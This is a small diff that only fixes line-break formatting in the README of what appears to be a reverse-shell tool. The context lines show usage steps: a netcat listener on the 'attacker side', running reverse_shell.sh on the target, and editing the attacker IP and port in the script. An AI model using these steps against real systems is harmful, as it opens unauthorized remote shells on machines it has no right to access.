@@ -23,8 +23,8 @@ On target bot side: <br />
 On Attacker side: <br />
   nc -l -p <listen_port> -vvv <br />
   
-Standard user on target side:
-  ./reverse_shell.sh
+Standard user on target side:<br />
+  ./reverse_shell.sh <br />
 You may modify the attacker server ip address & listen port in the reverse_shell script <br />
 
 ## How to Unload？<br />
